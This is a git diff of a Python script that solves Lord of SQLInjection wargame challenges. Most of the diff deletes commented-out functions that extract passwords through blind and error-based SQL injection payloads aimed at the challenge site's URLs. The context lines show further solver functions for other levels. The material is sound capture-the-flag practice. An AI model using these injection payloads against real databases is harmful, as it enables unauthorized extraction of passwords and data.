@@ -2,7 +2,6 @@
 import urllib.parse
 import requests
 # 간단한 http 요청시 사용
-import http.cookiejar
 import binascii
 
 
@@ -32,6 +31,7 @@ def error_based_blind_sqlinjection(cookie, url, encoded_params, pw_char):
 
     except urllib.error.HTTPError as e:
         print(e)
+
 def blind_sqlinjection(cookie, url, encoded_params, pw_char):
     try:
         
@@ -47,115 +47,6 @@ def blind_sqlinjection(cookie, url, encoded_params, pw_char):
 
     except urllib.error.HTTPError as e:
         print(e)
-
-'''
-def iron_golem_other_char_check(hdr,pw_index,ans):
-    for ascii_char in range(33,128):
-        inject_sentence = "1' or if(ord(substring(pw," + str(pw_index) + ",1))=" + str(ascii_char) + ",1,(select 1 union select 2)) -- "
-        
-        params = urllib.parse.urlencode({"pw" : inject_sentence})
-
-        url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?%s" % params
-        
-        print(url)
-
-        request = urllib.request.Request(url, headers = hdr)
-        cj = urllib.request.CookieJar()
-        request = urllib.request.HTTPCookieProcessor()
-        response = urllib.request.urlopen(request)
-
-        data = response.read()
-        data = data.decode('utf-8')
-
-        if data.find("Subquery returns more than 1 row") == -1:
-            ans = ans + str(ascii_char) + " "
-            return ans
-
-def iron_golem_admin_check(cookie,pw_index,mid):
-    #해당 mid 값이 해당 자리에 맞는 값인지를 확인
-
-    inject_sentence = "1' or if(ord(substring(pw," + str(pw_index) + ",1))="+ str(mid) + ",1,(select 1 union select 2)) -- "
-
-    encoded_params = urllib.parse.urlencode({"pw":inject_sentence})
-
-    url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?"
-
-    print(url)
-
-    find_pw_char = blind_sqlinjection(cookie,url, encoded_params, )
-    
-    request = urllib.request.Request(url, headers = hdr)
-    response = urllib.request.urlopen(request) 
-
-    data = response.read()
-    data = data.decode('utf-8')
-
-    if data.find("Subquery returns more than 1 row") == -1:
-        ans = [1,mid]
-        return ans
-    
-    ans = [0,0]
-
-    return ans
-    
-
-
-
-                
-#한글 유니코드값 10진수 범위 : 44032 ~ 50813
-
-def iron_golem(cookie):
-    for pw_index in range(1,18):
-        kor_range = [44032, 50813]
-        op = '<'
-
-        while(kor_range[0] != kor_range[1] and (kor_range[1]-kor_range[0])!=1):
-            mid = (kor_range[0] + kor_range[1]) // 2
-
-            
-            if(admin_chk[1] != 0):
-                ans = ans + str(admin_chk[1]) + " "
-                print(ans)
-                break
-
-            inject_sentence = "1' or if(ord(substring(pw," + str(pw_index) + ",1))" + op + str(mid) + ",1,(select 1 union select 2)) -- "
-
-            params = urllib.parse.urlencode({"pw":inject_sentence})
-
-            url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?%s" % params
-
-            print(url)
-
-            request = urllib.request.Request(url, headers = hdr)
-            response = urllib.request.urlopen(request)
-            
-            data = response.read()
-            data = data.decode('utf-8')
-
-            if data.find("Subquery returns more than 1 row") == -1:
-                if(op == '<'):
-                    kor_range[1] = mid
-                elif(op == '>'):
-                    kor_range[0] = mid
-            else:
-                if(op == '<'): 
-                    op = '>'
-                elif(op == '>'):
-                    op = '<'
-
-        if(admin_chk[0] != 1):
-            for admin_index in kor_range:
-                admin_chk = iron_golem_admin_check(hdr,pw_index,admin_index)
-                
-                if(admin_chk[0] == 1):
-                    ans = ans + str(admin_chk[1]) + " "
-                    print(ans)
-                    break
-
-            ans = iron_golem_other_char_check(hdr,pw_index,ans)
-            print(ans)
-        
-'''
 
 def iron_golem(cookie):
     ans = ""
@@ -180,6 +71,7 @@ def iron_golem(cookie):
                 continue
 
     print("pw is" + ans)
+
 def dragon(cookie):
     url = "https://los.rubiya.kr/chall/dragon_51996aa769df79afbf79eb4d66dbcef6.php?"
     
@@ -400,30 +292,6 @@ def assassin(cookie):
 
     print("pw is " + ans)
 
-'''
-def golem(cookie):
-    ans = ""
-    url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php"
-
-    for pw_length in range(1,9):
-        for pw_char in range(33,128):
-            inject_sentence = "1\'||right(left(pw," + str(pw_length) + "),1) like " + chr(pw_char) + " -- \'"
-                
-            encoded_params = urllib.parse.urlencode({'pw':inject_sentence})
-
-            find_pw_char = blind_sqlinjection(cookie, url, encoded_params, pw_char)
-
-            if find_pw_char != 0:
-                ans = ans + chr(pw_char)
-                print(ans)
-                break
-            else:
-                continue
-    return "pw is " + ans
-'''
-
-# 골렘 풀이 다른버전
-
 def golem(cookie):
     ans = ""
     url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php"
@@ -461,6 +329,7 @@ def orge(cookie):
             else:
                 continue
     return "pw is " + ans
+    
 def orc(cookie):
     ans = ""
     url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
